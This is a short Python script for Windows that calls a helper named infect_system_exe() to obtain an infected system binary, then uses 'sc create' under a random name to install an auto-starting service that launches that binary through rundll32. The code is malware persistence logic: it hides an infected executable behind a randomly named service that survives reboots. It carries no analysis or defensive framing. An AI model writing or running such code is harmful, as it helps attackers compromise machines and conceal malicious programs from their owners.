import winutils
import subprocess

binary = winutils.infect_system_exe()
name = winutils.random_name()

subprocess.call(['sc', 'create', name, 'Displayname=', name, 'binpath=', 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary), 'start=', 'auto'])
